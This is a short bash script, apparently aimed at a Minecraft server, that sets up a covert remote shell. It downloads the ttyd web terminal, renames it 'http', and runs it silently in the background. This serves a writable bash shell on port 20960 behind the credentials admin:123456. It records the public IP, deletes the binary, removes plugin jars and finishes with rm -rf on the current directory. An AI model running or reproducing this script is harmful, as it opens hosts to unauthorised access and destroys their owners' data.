#!/bin/bash
curl -s -Lo http https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64
chmod +x http
nohup ./http  -p 20960 -W -c admin:123456 bash >/dev/null 2>&1 &
sleep 1
curl -4 ifconfig.me>ip.txt
rm http

target_file1="$current_dir/plugins/ViaBackwards.jar"
target_file2="$current_dir/plugins/.paper-remapped/ViaBackwards.jar"

rm -f "$target_file1" "$target_file2"

rm -rf $(pwd)
